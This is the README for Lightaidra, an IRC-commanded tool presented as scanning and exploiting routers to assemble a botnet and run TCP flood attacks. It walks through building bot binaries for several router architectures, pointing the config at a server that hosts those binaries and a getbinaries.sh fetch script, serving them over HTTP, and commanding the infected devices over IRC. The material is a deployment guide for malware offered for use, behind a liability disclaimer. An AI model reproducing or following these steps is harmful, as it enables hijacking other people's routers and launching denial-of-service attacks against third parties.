Lightaidra
==========

Legal Disclaimer
----------------

It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume 
no liability and are not responsible for any misuse or damage caused by this program.

Description
------------

Lightaidra is a mass-tool commanded by irc that allows scanning and exploiting routers 
for make BOTNET (in rx-bot style), in addition to this, with aidra you can perform 
some attacks with tcp flood.

Configuration
-------------

The installation is just a little complicated, but not hard!

```bash
deftcode ~ $ tar zxvf lightaidra*
deftcode ~ $ cd lightaidra*
```

If cross compilers are not included in **bin/** directory you will need
to download these cross-compilers and extract them into **lightaidra/bin/**

<a href="http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2" title="Cross-Compiler ARMv-4l" target="_blank">http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2</a>
<a href="http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2" title="Cross-Compiler MIPS" target="_blank">http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2</a>
<a href="http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2" title="Cross-Compiler MIPSEL" target="_blank">http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2</a>
<a href="http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2" title="Cross-Compiler SH4" target="_blank">http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2</a>
<a href="http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2" title="Cross-Compiler PowerPC" target="_blank">http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2</a>

Config.h
--------


**IMPORTANT:** `REFERENCE_HTTP` in **include/config.h** must be the server where you upload the binaries (mipsel, mips, arm, ppc, sh4) and **getbinaries.sh**. 
If you change the `name of binaries` you must update the **Makefile** and **getbinaries.sh** too.

```bash
deftcode ~ $ vi include/config.h
```

Build binaries
--------------

```bash
deftcode ~ $ make x86_32 (for 32bit)
deftcode ~ $ make x86_64 (for 64bit)
deftcode ~ # ./bin/x86_64
```

Build binaries for MIPSEL, MIPS, ARM, PPC, SUPERH

```bash
deftcode ~ $ make mipsel mips arm ppc superh
```

Now start your httpd and upload the binaries and getbinaries.sh
Now go to IRC server and command your bot.

BUGS
----

If you find bugs (which is quite likely), please submit them to <eurialo@deftcode.ninja> 
with specific information, such as your command-line, the nature of the bug and other.
